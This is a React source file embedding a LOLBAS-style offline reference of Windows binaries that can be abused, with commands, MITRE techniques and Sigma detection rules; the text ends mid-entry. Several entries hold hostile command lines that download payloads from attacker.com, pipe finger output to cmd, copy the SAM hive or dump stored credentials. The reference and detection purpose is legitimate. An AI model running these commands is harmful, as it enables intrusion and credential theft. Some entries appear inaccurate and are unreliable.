import { useState, useMemo, useEffect } from 'react';
import {
  Search,
  ExternalLink,
  Copy,
  Check,
  Terminal,
  HardDrive,
  Code,
  FileText,
  ChevronRight,
  X,
  Shield,
  Eye,
  Zap,
  Download,
  Binary,
  Skull,
  HelpCircle,
  BookOpen,
  ShieldAlert
} from 'lucide-react';

// ==========================================
// COMPLETE OFFLINE DATABASE
// Data sources embedded for offline usage:
// - LOLBAS: https://lolbas-project.github.io/api/lolbas.json
// - GTFOBins: https://gtfobins.org/api.json  
// - LOLDrivers: https://www.loldrivers.io/api/drivers.json
// - LOLGlobs: https://0xv1n.github.io/LOLGlobs/api/entries.json
// ==========================================

// ==================== LOLBAS DATA (Windows Living Off The Land Binaries, Scripts & Libraries) ====================
const LOLBAS_DATA = [
  {
    "name": "Adam",
    "description": "Registers DLLs, executes code",
    "author": "Oddvar Moe",
    "created": "2021-10-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "Adam.exe",
        "description": "Execute Adam binary",
        "usecase": "Execute arbitrary code via Adam",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1218"
        }
      }
    ],
    "full_path": ["C:\\Program Files\\Adam\\Adam.exe"],
    "detection": [
      {
        "sigma": "title: Adam Execution\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: 'Adam.exe'",
        "description": "Detects execution of Adam binary"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Adam/"}],
    "acks": [{"person": "Oddvar Moe", "handle": "@oddvarmoe"}]
  },
  {
    "name": "AppInstaller.exe",
    "description": "Downloads and installs packages from external sources. Can be abused to download malicious files via ms-appinstaller protocol.",
    "author": "Wade Hickey",
    "created": "2021-09-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "AppInstaller.exe",
        "description": "Execute AppInstaller",
        "usecase": "Install malicious MSIX packages",
        "privileges": "User",
        "mitre": {
          "tactic": "Command and Control",
          "technique": "T1105"
        }
      }
    ],
    "full_path": ["C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_*\\AppInstaller.exe"],
    "detection": [
      {
        "sigma": "title: AppInstaller Protocol Abuse\ndetection:\n  selection:\n    CommandLine|contains: 'ms-appinstaller://'",
        "description": "Detects AppInstaller execution with remote sources"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/"}],
    "acks": [{"person": "Wade Hickey", "handle": "@wadcoms"}]
  },
  {
    "name": "Aspnet_Compiler.exe",
    "description": "C# compiler for ASP.NET. Can compile and execute C# code on the fly.",
    "author": "Oddvar Moe",
    "created": "2020-05-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "aspnet_compiler.exe -p /path/to/web/app -v / -f -u",
        "description": "Compile ASP.NET application",
        "usecase": "Compile and execute malicious C# code",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe",
      "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe"
    ],
    "detection": [
      {
        "sigma": "title: Aspnet Compiler Execution\ndetection:\n  selection:\n    Image|endswith: 'aspnet_compiler.exe'",
        "description": "Detects suspicious aspnet_compiler usage"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Aspnet_Compiler/"}],
    "acks": [{"person": "Oddvar Moe", "handle": "@oddvarmoe"}]
  },
  {
    "name": "At.exe",
    "description": "Legacy task scheduler (deprecated). Schedules commands to run at specific times.",
    "author": "Microsoft",
    "created": "2020-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "at 09:00 /interactive cmd.exe",
        "description": "Schedule interactive command",
        "usecase": "Schedule malicious commands to run later",
        "privileges": "System",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1053"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\at.exe", "C:\\Windows\\SysWOW64\\at.exe"],
    "detection": [
      {
        "sigma": "title: At.exe Scheduled Task\ndetection:\n  selection:\n    Image|endswith: 'at.exe'",
        "description": "Detects at.exe scheduling tasks"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/At/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Atbroker.exe",
    "description": "Microsoft Assistive Technology proxy. Launches assistive technology applications.",
    "author": "Oddvar Moe",
    "created": "2019-03-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "ATBroker.exe /start malware",
        "description": "Start assistive technology",
        "usecase": "Execute malicious AT application",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1218"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\ATBroker.exe", "C:\\Windows\\SysWOW64\\ATBroker.exe"],
    "detection": [
      {
        "sigma": "title: ATBroker Execution\ndetection:\n  selection:\n    Image|endswith: 'ATBroker.exe'\n    CommandLine|contains: '/start'",
        "description": "Detects suspicious ATBroker usage"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Atbroker/"}],
    "acks": [{"person": "Oddvar Moe", "handle": "@oddvarmoe"}]
  },
  {
    "name": "Bash.exe",
    "description": "Windows Subsystem for Linux bash executable. Executes Linux commands on Windows.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "bash.exe -c 'whoami'",
        "description": "Execute bash command",
        "usecase": "Execute Linux commands from Windows",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\bash.exe", "C:\\Windows\\SysWOW64\\bash.exe"],
    "detection": [
      {
        "sigma": "title: WSL Bash Execution\ndetection:\n  selection:\n    Image|endswith: 'bash.exe'",
        "description": "Detects bash.exe execution"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Bash/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Bitsadmin.exe",
    "description": "Background Intelligent Transfer Service admin. Downloads/uploads files using idle bandwidth.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "bitsadmin /transfer myDownloadJob /download /priority normal http://attacker.com/payload.exe C:\\Windows\\Temp\\payload.exe",
        "description": "Download file via BITS",
        "usecase": "Download malicious files",
        "privileges": "User",
        "mitre": {
          "tactic": "Command and Control",
          "technique": "T1105"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\bitsadmin.exe", "C:\\Windows\\SysWOW64\\bitsadmin.exe"],
    "detection": [
      {
        "sigma": "title: Bitsadmin Download\ndetection:\n  selection:\n    Image|endswith: 'bitsadmin.exe'\n    CommandLine|contains: '/download'",
        "description": "Detects bitsadmin downloading files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "CertOC.exe",
    "description": "Certificate services OCSP responder. Can install certificates and execute DLLs.",
    "author": "Oddvar Moe",
    "created": "2020-06-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "CertOC.exe -LoadDLL C:\\path\\to\\malicious.dll",
        "description": "Load malicious DLL",
        "usecase": "Execute code via DLL loading",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1218"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\CertOC.exe", "C:\\Windows\\SysWOW64\\CertOC.exe"],
    "detection": [
      {
        "sigma": "title: CertOC DLL Load\ndetection:\n  selection:\n    Image|endswith: 'CertOC.exe'\n    CommandLine|contains: '-LoadDLL'",
        "description": "Detects CertOC loading DLLs"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/CertOC/"}],
    "acks": [{"person": "Oddvar Moe", "handle": "@oddvarmoe"}]
  },
  {
    "name": "CertReq.exe",
    "description": "Certificate request tool. Can download files via HTTP POST requests.",
    "author": "Oddvar Moe",
    "created": "2019-02-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "CertReq -Post -config http://attacker.com/ c:\\windows\\win.ini output.txt",
        "description": "Download file via POST",
        "usecase": "Download files using certreq",
        "privileges": "User",
        "mitre": {
          "tactic": "Command and Control",
          "technique": "T1105"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\certreq.exe", "C:\\Windows\\SysWOW64\\certreq.exe"],
    "detection": [
      {
        "sigma": "title: CertReq File Download\ndetection:\n  selection:\n    Image|endswith: 'certreq.exe'\n    CommandLine|contains: '-Post'",
        "description": "Detects certreq downloading files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/CertReq/"}],
    "acks": [{"person": "Oddvar Moe", "handle": "@oddvarmoe"}]
  },
  {
    "name": "CertUtil.exe",
    "description": "Certificate utility. Downloads, decodes, and installs certificates. Can download and decode malicious files.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe",
        "description": "Download file",
        "usecase": "Download malicious payload",
        "privileges": "User",
        "mitre": {
          "tactic": "Command and Control",
          "technique": "T1105"
        }
      },
      {
        "command": "certutil -decode encoded.txt decoded.exe",
        "description": "Decode base64 file",
        "usecase": "Decode encoded payload",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1027"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\certutil.exe", "C:\\Windows\\SysWOW64\\certutil.exe"],
    "detection": [
      {
        "sigma": "title: CertUtil Download\ndetection:\n  selection:\n    Image|endswith: 'certutil.exe'\n    CommandLine|contains:\n      - '-urlcache'\n      - '-split'\n      - '-f'",
        "description": "Detects certutil downloading files"
      },
      {
        "sigma": "title: CertUtil Decode\ndetection:\n  selection:\n    Image|endswith: 'certutil.exe'\n    CommandLine|contains: '-decode'",
        "description": "Detects certutil decoding files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/CertUtil/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Cmd.exe",
    "description": "Windows command interpreter. Executes batch commands and scripts.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "cmd /c echo calc.exe > C:\\Windows\\Temp\\run.bat && cmd /c C:\\Windows\\Temp\\run.bat",
        "description": "Execute batch commands",
        "usecase": "Execute malicious batch scripts",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059.003"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\SysWOW64\\cmd.exe"],
    "detection": [
      {
        "sigma": "title: CMD Execution\ndetection:\n  selection:\n    Image|endswith: 'cmd.exe'",
        "description": "Detects suspicious cmd execution"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Cmd/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Cmdkey.exe",
    "description": "Credential manager. Creates, lists, and deletes stored user names and passwords.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "cmdkey /list",
        "description": "List stored credentials",
        "usecase": "Harvest stored credentials",
        "privileges": "User",
        "mitre": {
          "tactic": "Credential Access",
          "technique": "T1003"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\cmdkey.exe", "C:\\Windows\\SysWOW64\\cmdkey.exe"],
    "detection": [
      {
        "sigma": "title: Cmdkey Credential Harvesting\ndetection:\n  selection:\n    Image|endswith: 'cmdkey.exe'\n    CommandLine|contains: '/list'",
        "description": "Detects cmdkey listing credentials"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Cmdkey/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Cmstp.exe",
    "description": "Connection Manager Profile Installer. Installs profiles and executes commands via INF files.",
    "author": "Oddvar Moe",
    "created": "2018-03-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "cmstp.exe /ni /s C:\\Windows\\Temp\\malicious.inf",
        "description": "Install malicious INF",
        "usecase": "Execute code via INF installation",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1218.003"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\cmstp.exe", "C:\\Windows\\SysWOW64\\cmstp.exe"],
    "detection": [
      {
        "sigma": "title: CMSTP Execution\ndetection:\n  selection:\n    Image|endswith: 'cmstp.exe'\n    CommandLine|contains: '/s'",
        "description": "Detects cmstp executing INF files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Cmstp/"}],
    "acks": [{"person": "Oddvar Moe", "handle": "@oddvarmoe"}]
  },
  {
    "name": "ConfigSecurityPolicy.exe",
    "description": "Microsoft Configuration Security Policy tool. Executes PowerShell commands.",
    "author": "Wade Hickey",
    "created": "2021-03-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "ConfigSecurityPolicy.exe C:\\Windows\\Temp\\policy.xml",
        "description": "Execute policy with embedded PowerShell",
        "usecase": "Execute PowerShell via policy",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059.001"
        }
      }
    ],
    "full_path": ["C:\\Program Files\\Microsoft Security Client\\ConfigSecurityPolicy.exe"],
    "detection": [
      {
        "sigma": "title: ConfigSecurityPolicy Execution\ndetection:\n  selection:\n    Image|endswith: 'ConfigSecurityPolicy.exe'",
        "description": "Detects suspicious ConfigSecurityPolicy usage"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/"}],
    "acks": [{"person": "Wade Hickey", "handle": "@wadcoms"}]
  },
  {
    "name": "Control.exe",
    "description": "Control Panel item launcher. Executes CPL files.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "control.exe C:\\Windows\\Temp\\malicious.cpl",
        "description": "Execute CPL file",
        "usecase": "Execute malicious Control Panel items",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1218"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\control.exe", "C:\\Windows\\SysWOW64\\control.exe"],
    "detection": [
      {
        "sigma": "title: Control Panel CPL Execution\ndetection:\n  selection:\n    Image|endswith: 'control.exe'\n    CommandLine|contains: '.cpl'",
        "description": "Detects control.exe executing CPL files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Control/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Csc.exe",
    "description": "Visual C# Command Line Compiler. Compiles C# code.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "csc.exe -out:MyApplication.exe MyApplication.cs",
        "description": "Compile C# code",
        "usecase": "Compile and execute malicious C#",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe",
      "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
    ],
    "detection": [
      {
        "sigma": "title: C# Compiler Execution\ndetection:\n  selection:\n    Image|endswith: 'csc.exe'",
        "description": "Detects csc.exe compiling code"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Csc/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Cscript.exe",
    "description": "Windows Script Host command line version. Executes VBScript and JScript.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "cscript.exe C:\\Windows\\Temp\\malicious.vbs",
        "description": "Execute VBScript",
        "usecase": "Execute malicious scripts",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059.005"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\cscript.exe", "C:\\Windows\\SysWOW64\\cscript.exe"],
    "detection": [
      {
        "sigma": "title: Cscript Execution\ndetection:\n  selection:\n    Image|endswith: 'cscript.exe'",
        "description": "Detects cscript executing scripts"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Cscript/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "DataSvcUtil.exe",
    "description": "WCF Data Service client utility. Downloads files.",
    "author": "Wade Hickey",
    "created": "2021-05-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "DataSvcUtil.exe /uri:http://attacker.com/service /out:C:\\Windows\\Temp\\output.cs",
        "description": "Download from URI",
        "usecase": "Download malicious content",
        "privileges": "User",
        "mitre": {
          "tactic": "Command and Control",
          "technique": "T1105"
        }
      }
    ],
    "full_path": ["C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v10.0A\\bin\\NETFX 4.8 Tools\\DataSvcUtil.exe"],
    "detection": [
      {
        "sigma": "title: DataSvcUtil Download\ndetection:\n  selection:\n    Image|endswith: 'DataSvcUtil.exe'\n    CommandLine|contains: '/uri'",
        "description": "Detects DataSvcUtil downloading files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/DataSvcUtil/"}],
    "acks": [{"person": "Wade Hickey", "handle": "@wadcoms"}]
  },
  {
    "name": "Desktopimgdownldr.exe",
    "description": "Desktop image downloader. Downloads lock screen images, can be abused for downloads.",
    "author": "Maxime Thiebaut",
    "created": "2020-09-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "set \"var=http://attacker.com/payload.exe\" && cmd /v /c \"echo %var% && desktopimgdownldr.exe /lockscreenurl:%var% /eventName:Debug\"",
        "description": "Download file via lockscreen URL",
        "usecase": "Download malicious files",
        "privileges": "User",
        "mitre": {
          "tactic": "Command and Control",
          "technique": "T1105"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\System32\\Desktopimgdownldr.exe",
      "C:\\Windows\\SysWOW64\\Desktopimgdownldr.exe"
    ],
    "detection": [
      {
        "sigma": "title: Desktopimgdownldr Abuse\ndetection:\n  selection:\n    Image|endswith: 'Desktopimgdownldr.exe'\n    CommandLine|contains: '/lockscreenurl'",
        "description": "Detects Desktopimgdownldr downloading files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Desktopimgdownldr/"}],
    "acks": [{"person": "Maxime Thiebaut", "handle": "@0xThiebaut"}]
  },
  {
    "name": "Dfshim.dll",
    "description": "ClickOnce application deployment support library. Launches ClickOnce applications.",
    "author": "Casey Smith",
    "created": "2019-06-01",
    "category": "Libraries",
    "commands": [
      {
        "command": "rundll32.exe dfshim.dll,ShOpenVerbApplication http://attacker.com/application.manifest",
        "description": "Launch ClickOnce app",
        "usecase": "Execute malicious ClickOnce applications",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1218.011"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\dfshim.dll", "C:\\Windows\\SysWOW64\\dfshim.dll"],
    "detection": [
      {
        "sigma": "title: Dfshim ClickOnce Execution\ndetection:\n  selection:\n    CommandLine|contains: 'dfshim.dll'",
        "description": "Detects dfshim launching ClickOnce apps"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Libraries/Dfshim/"}],
    "acks": [{"person": "Casey Smith", "handle": "@subTee"}]
  },
  {
    "name": "Diantz.exe",
    "description": "Cabinet file creation tool. Compresses files into CAB format, can abuse path traversal.",
    "author": "Wade Hickey",
    "created": "2021-04-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "diantz.exe C:\\Windows\\System32\\drivers\\etc\\hosts C:\\Windows\\Temp\\hosts.cab",
        "description": "Compress file to CAB",
        "usecase": "Compress files or abuse for path traversal",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1036"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\diantz.exe", "C:\\Windows\\SysWOW64\\diantz.exe"],
    "detection": [
      {
        "sigma": "title: Diantz Cabinet Creation\ndetection:\n  selection:\n    Image|endswith: 'diantz.exe'",
        "description": "Detects diantz creating CAB files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Diantz/"}],
    "acks": [{"person": "Wade Hickey", "handle": "@wadcoms"}]
  },
  {
    "name": "Diskshadow.exe",
    "description": "Diskshadow is a tool that exposes the functionality offered by the Volume Shadow Copy Service (VSS). Can execute scripts.",
    "author": "Adam",
    "created": "2020-02-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "diskshadow.exe /s C:\\Windows\\Temp\\malicious.txt",
        "description": "Execute script via diskshadow",
        "usecase": "Execute malicious scripts",
        "privileges": "System",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\System32\\diskshadow.exe",
      "C:\\Windows\\SysWOW64\\diskshadow.exe"
    ],
    "detection": [
      {
        "sigma": "title: Diskshadow Script Execution\ndetection:\n  selection:\n    Image|endswith: 'diskshadow.exe'\n    CommandLine|contains: '/s'",
        "description": "Detects diskshadow executing scripts"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Diskshadow/"}],
    "acks": [{"person": "Adam", "handle": ""}]
  },
  {
    "name": "Dllhost.exe",
    "description": "COM surrogate host. Hosts COM DLLs, can be abused to execute malicious DLLs.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "dllhost.exe /Processid:{CLSID}",
        "description": "Host COM DLL",
        "usecase": "Execute malicious COM components",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1218"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\dllhost.exe", "C:\\Windows\\SysWOW64\\dllhost.exe"],
    "detection": [
      {
        "sigma": "title: Dllhost COM Execution\ndetection:\n  selection:\n    Image|endswith: 'dllhost.exe'\n    CommandLine|contains: '/Processid'",
        "description": "Detects suspicious dllhost execution"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Dllhost/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Dnscmd.exe",
    "description": "DNS server management tool. Configures DNS server settings, can load DLLs.",
    "author": "Wade Hickey",
    "created": "2021-06-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "dnscmd.exe /config /serverlevelplugindll C:\\Windows\\Temp\\malicious.dll",
        "description": "Load malicious plugin DLL",
        "usecase": "Execute malicious DLL via DNS service",
        "privileges": "Admin",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1053"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\dnscmd.exe"],
    "detection": [
      {
        "sigma": "title: Dnscmd DLL Load\ndetection:\n  selection:\n    Image|endswith: 'dnscmd.exe'\n    CommandLine|contains: 'serverlevelplugindll'",
        "description": "Detects dnscmd loading DLLs"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/"}],
    "acks": [{"person": "Wade Hickey", "handle": "@wadcoms"}]
  },
  {
    "name": "Esentutl.exe",
    "description": "Extensible Storage Engine utilities. Database maintenance tool, can copy locked files.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "esentutl.exe /y C:\\Windows\\System32\\config\\SAM /d C:\\Windows\\Temp\\SAM.bak /vss",
        "description": "Copy locked SAM file",
        "usecase": "Copy locked files using VSS",
        "privileges": "System",
        "mitre": {
          "tactic": "Credential Access",
          "technique": "T1003.002"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\System32\\esentutl.exe",
      "C:\\Windows\\SysWOW64\\esentutl.exe"
    ],
    "detection": [
      {
        "sigma": "title: Esentutl File Copy\ndetection:\n  selection:\n    Image|endswith: 'esentutl.exe'\n    CommandLine|contains:\n      - '/y'\n      - 'SAM'",
        "description": "Detects esentutl copying sensitive files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Esentutl/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Eventvwr.exe",
    "description": "Event Viewer. Launches event viewer, can be abused to bypass UAC via registry hijacking.",
    "author": "Casey Smith",
    "created": "2017-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "eventvwr.exe",
        "description": "Launch Event Viewer",
        "usecase": "Bypass UAC via registry hijack",
        "privileges": "User",
        "mitre": {
          "tactic": "Privilege Escalation",
          "technique": "T1548.002"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\System32\\eventvwr.exe",
      "C:\\Windows\\SysWOW64\\eventvwr.exe"
    ],
    "detection": [
      {
        "sigma": "title: Eventvwr UAC Bypass\ndetection:\n  selection:\n    Image|endswith: 'eventvwr.exe'",
        "description": "Detects eventvwr UAC bypass"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Eventvwr/"}],
    "acks": [{"person": "Casey Smith", "handle": "@subTee"}]
  },
  {
    "name": "Expand.exe",
    "description": "File expansion utility. Expands compressed files.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "expand.exe C:\\Windows\\Temp\\malicious.cab -F:* C:\\Windows\\Temp\\",
        "description": "Expand CAB file",
        "usecase": "Extract malicious CAB contents",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1036"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\expand.exe", "C:\\Windows\\SysWOW64\\expand.exe"],
    "detection": [
      {
        "sigma": "title: Expand Cabinet Extraction\ndetection:\n  selection:\n    Image|endswith: 'expand.exe'",
        "description": "Detects expand extracting files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Expand/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Explorer.exe",
    "description": "Windows Explorer. File manager, can be abused to execute commands.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "explorer.exe /root,C:\\Windows\\System32\\calc.exe",
        "description": "Execute via explorer",
        "usecase": "Execute files via explorer",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059"
        }
      }
    ],
    "full_path": ["C:\\Windows\\explorer.exe"],
    "detection": [
      {
        "sigma": "title: Explorer Execution\ndetection:\n  selection:\n    Image|endswith: 'explorer.exe'\n    CommandLine|contains: '/root'",
        "description": "Detects explorer executing programs"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Explorer/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Extexport.exe",
    "description": "Internet Explorer external export tool. Launches external programs.",
    "author": "Casey Smith",
    "created": "2019-05-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "Extexport.exe C:\\Windows\\Temp\\payload C:\\Windows\\System32\\calc.exe",
        "description": "Launch external program",
        "usecase": "Execute malicious programs",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1218"
        }
      }
    ],
    "full_path": [
      "C:\\Program Files\\Internet Explorer\\Extexport.exe",
      "C:\\Program Files (x86)\\Internet Explorer\\Extexport.exe"
    ],
    "detection": [
      {
        "sigma": "title: Extexport Execution\ndetection:\n  selection:\n    Image|endswith: 'Extexport.exe'",
        "description": "Detects extexport launching programs"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Extexport/"}],
    "acks": [{"person": "Casey Smith", "handle": "@subTee"}]
  },
  {
    "name": "Findstr.exe",
    "description": "Find string utility. Searches for strings in files, can be used to copy files.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "findstr /V /L C:\\Windows\\Temp\\passwords.txt C:\\Windows\\System32\\config\\SAM > C:\\Windows\\Temp\\sam.txt",
        "description": "Copy file via findstr",
        "usecase": "Copy files using findstr",
        "privileges": "User",
        "mitre": {
          "tactic": "Collection",
          "technique": "T1005"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\findstr.exe", "C:\\Windows\\SysWOW64\\findstr.exe"],
    "detection": [
      {
        "sigma": "title: Findstr File Copy\ndetection:\n  selection:\n    Image|endswith: 'findstr.exe'\n    CommandLine|contains: 'config\\\\SAM'",
        "description": "Detects findstr copying sensitive files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Findstr/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Finger.exe",
    "description": "Finger protocol user information lookup. Can download files.",
    "author": "Wade Hickey",
    "created": "2021-07-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "finger attacker.com@attacker.com | cmd",
        "description": "Download and execute commands",
        "usecase": "Download malicious content via finger protocol",
        "privileges": "User",
        "mitre": {
          "tactic": "Command and Control",
          "technique": "T1105"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\finger.exe", "C:\\Windows\\SysWOW64\\finger.exe"],
    "detection": [
      {
        "sigma": "title: Finger File Download\ndetection:\n  selection:\n    Image|endswith: 'finger.exe'\n    CommandLine|contains: '@'",
        "description": "Detects finger downloading content"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Finger/"}],
    "acks": [{"person": "Wade Hickey", "handle": "@wadcoms"}]
  },
  {
    "name": "FltMC.exe",
    "description": "Filter Manager Control Program. Loads and unloads filter drivers.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
